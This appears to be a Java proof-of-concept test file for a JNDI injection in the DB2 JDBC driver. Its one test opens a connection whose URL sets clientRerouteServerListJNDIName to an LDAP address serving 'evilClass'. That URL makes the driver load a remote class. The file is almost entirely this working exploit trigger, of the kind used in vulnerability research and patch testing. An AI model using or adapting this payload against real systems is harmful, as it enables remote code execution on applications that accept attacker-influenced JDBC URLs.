package com.trganda.poc;

import org.junit.jupiter.api.Test;

import java.sql.DriverManager;
import java.sql.SQLException;

public class Poc {
    @Test
    public void db2() throws SQLException {
        String url =
                "jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1389/evilClass;";
        DriverManager.getConnection(url);
    }
}
